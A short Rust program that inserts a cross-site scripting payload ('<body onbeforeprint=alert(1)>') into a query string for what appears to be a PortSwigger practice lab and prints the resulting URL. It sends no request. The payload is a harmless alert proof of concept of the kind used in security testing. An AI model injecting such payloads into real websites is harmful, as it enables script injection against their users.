// Dependencies
use isahc; // 0.9.3
use regex::Regex; // 1.3.9

fn main() {
    let payload = "<body onbeforeprint=alert(1)>";
    let url = "https://portswigger-labs.net/xss/xss.php?x=$";
    let re = Regex::new("\\$").unwrap();
    let url2 = re.replace(url, payload);
    println!("{:?}", url2); // This prints https://portswigger-labs.net/xss/xss.php?x=<body onbeforeprint=alert(1)>
}
